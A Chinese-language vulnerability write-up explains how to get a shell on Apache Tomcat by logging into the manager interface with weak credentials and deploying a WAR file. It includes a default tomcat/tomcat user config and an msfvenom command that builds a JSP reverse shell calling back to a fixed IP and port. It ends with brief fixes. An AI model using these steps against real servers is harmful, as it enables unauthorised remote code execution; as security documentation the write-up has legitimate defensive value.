### 0x00简述

漏洞名称：Tomcat 后台管理弱口令GETSHELL

漏洞影响：上传包含任意代码的文件，并被服务器执行。

影响平台：ALL

影响版本：ALL

### 0x01利用

漏洞利用的前提就是当前环境有弱口令且账号权限是 `manager-gui`，对应配置文件为：`conf/tomcat-users.xml`中：

```
<role rolename="manager-gui"/>
<user username="tomcat" password="tomcat" roles="manager-gui"/>
```

然后就可访问`/manager/html` 进入后台管理界面部署WAR文件：

![1583230134224](G:\workDocs\我的文档\小书匠\漏洞整理\vulnCollection\Tomcat\images\1583230134224.png)

接下来我们就需要自己手动打包一个WAR包，首先使用msfvenom生成jsp文件：

```jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=100.119.111.139 LPORT=5353 R > cmd.jsp
```

使用命令将当前文件夹打包：

```
jar -cvfM0 hello.war ./
```

运行之后会在当前目录生产一个 `hello.war` :

![1583231125933](G:\workDocs\我的文档\小书匠\漏洞整理\vulnCollection\Tomcat\images\1583231125933.png)

上传并部署之后会提示一个消息 `OK` ：

![1583230507964](G:\workDocs\我的文档\小书匠\漏洞整理\vulnCollection\Tomcat\images\1583230507964.png)

然后我们点击hello并访问刚才上传的jsp文件，虽然页面是一片空白，但是这个时候已经获取到了服务器的CMD权限：

![1583231264685](G:\workDocs\我的文档\小书匠\漏洞整理\vulnCollection\Tomcat\images\1583231264685.png)

可以看到这个漏洞的杀伤力之大，但是在tomcat本身看来这个只是为了方便部署而设计的一个功能，所以只要是存在弱密码的情况，那么基本每个版本都可以拿到最后的权限。

### 0x02 修复

- 强密码
- 不要开manage的任何账户权限

### 0x03 参考链接

 https://www.freebuf.com/articles/web/36455.html 